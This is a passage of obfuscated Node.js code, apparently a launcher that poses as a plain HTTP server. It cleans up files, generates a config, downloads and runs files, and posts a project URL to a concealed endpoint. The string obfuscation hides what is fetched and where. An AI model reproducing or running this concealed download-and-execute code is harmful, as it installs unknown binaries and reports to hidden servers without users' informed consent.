axios[_0x281ffd(0x1d5)](_0x281ffd(0x14c),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x281ffd(0x1ba)}});return console['log'](_0x281ffd(0x201)),_0x401475;}catch(_0x200999){return console['error'](_0x281ffd(0x14b)+_0x200999[_0x281ffd(0x1bd)]),null;}}async function startserver(){const _0x1f5e10=_0x1fc5c7;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4e7730){console[_0x1f5e10(0x1a3)](_0x1f5e10(0x1b1),_0x4e7730);}}startserver()['catch'](_0x255ba7=>{const _0x5aadb3=_0x1fc5c7;console[_0x5aadb3(0x1a3)]('Unhandled\x20error\x20in\x20startserver:',_0x255ba7);}),app[_0x1fc5c7(0x1e2)](PORT,()=>console[_0x1fc5c7(0x1c6)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
